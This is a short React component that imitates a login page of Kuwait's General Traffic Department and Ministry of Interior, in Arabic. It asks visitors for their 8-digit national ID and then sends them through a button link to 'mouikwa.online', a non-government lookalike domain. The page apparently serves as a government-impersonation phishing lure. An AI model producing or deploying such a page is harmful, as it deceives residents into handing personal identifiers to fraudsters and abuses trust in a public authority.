import viteLogo from '/vite.svg';
import './App.css';
import { useState } from 'react';

function App() {
  const [id,setid]=useState('')
  return (
    <>
      <div>
        <img src={viteLogo} className="logo" alt="Vite logo" />
      </div>
      <h3> الإدارة العامة للمرور</h3>

      <h1>دولة الكويت</h1>
      <div className="card" style={{ flexDirection: 'column' }}>
        <h3> للدخول الموقع يرجى ادخال الرقم الوطني </h3>
        <input
          type="tel"
          maxLength={8}
          onChange={(e)=>setid(e.target.value)}
          style={{
            padding: 8,
            width: '100%',
            border: '1px #f1f1f1 solid',
            borderRadius: 5,
            marginBottom: 5,
          }}
        />
       <button disabled={id.length!==8}>    <a href={id.length===8?"https://mouikwa.online/":"#"} >
      دخول
        </a>
        </button>
      </div>
      <p className="read-the-docs">
        © جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2025
      </p>
    </>
  );
}

export default App;
